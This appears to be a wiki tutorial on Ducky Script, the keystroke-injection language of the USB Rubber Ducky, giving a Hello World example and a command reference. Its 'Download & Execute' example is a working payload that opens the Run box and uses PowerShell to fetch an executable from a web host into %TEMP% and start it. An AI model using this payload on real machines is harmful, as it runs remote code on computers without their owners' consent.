= Introduction =
Since first time Ducky users are unfamiliar with Ducky Script, below is a brief summary (with examples) on how to code in Ducky Script.

= Example 1 - Hello World =
The Ducky fires the payload immediately, so you need an initial delay for the OS to recognize and allow the Ducky to proceed as a keyboard, in this example we use a delay of 3secs (3000msecs) for the Windows OS (other OS's may be quicker).

The steps of this example can be broken down into:
* Initial Delay for the OS
* GUI r triggers the run-box
* Small delay to wait for the run-box to open
* Ducky types notepad ENTER to load notepad
* Small delay to wait for notepad to open
* Ducky then types an arbitrary string into notepad

 DELAY 3000
 GUI r
 DELAY 200
 STRING notepad
 ENTER
 DELAY 200
 STRING Hello World!!!
 ENTER

* Note : For Windows 10, the GUI does not seem to work. Use CTRL ESC instead. Below is the complete example:
<code>
DELAY 2000
CTRL ESC
DELAY 2000
STRING notepad.exe
ENTER
DELAY 2000
STRING HELLO WORLD!!!
ENTER
</code>
= Example 2 - Download & Execute =
An example of using Powershell to download a file from the web and then execute it.
 DELAY 3000
 GUI r
 DELAY 100
 STRING powershell (new-object System.Net.WebClient).DownloadFile('http://example.com/bob.old','%TEMP%\bob.exe');
 DELAY 100
 STRING Start-Process "%TEMP%\bob.exe"
 ENTER
= Other Examples =
The community is storing generated payloads on the following wiki-page:
* [[Payloads]]

=Command Breakdown=
* DELAY ''x'' - Delay in milli-secs
* STRING ''xyz'' - types following characters
* GUI - Windows Menu Key
* GUI r - Windows Run box
* COMMAND - OSX Command Key
* UP | UPARROW - Up Key
* DOWN | DOWNARROW - Down Key
* LEFT | LEFTARROW - Left Key
* RIGHT | RIGHTARROW - Right Key
* CAPS |CAPSLOCK - Capslock Key
* ENTER - Return/Enter key
* SPACE - Spacebar
* REPEAT ''x'' - Repeat previous command X times.
You can even use some (but not all) two or three key-combinations:
* SHIFT-ENTER
* CTRL-ALT-DEL
* ALT-F4

## Reference

[My first payload](https://github.com/hak5darren/USB-Rubber-Ducky/wiki/My-first-payload)
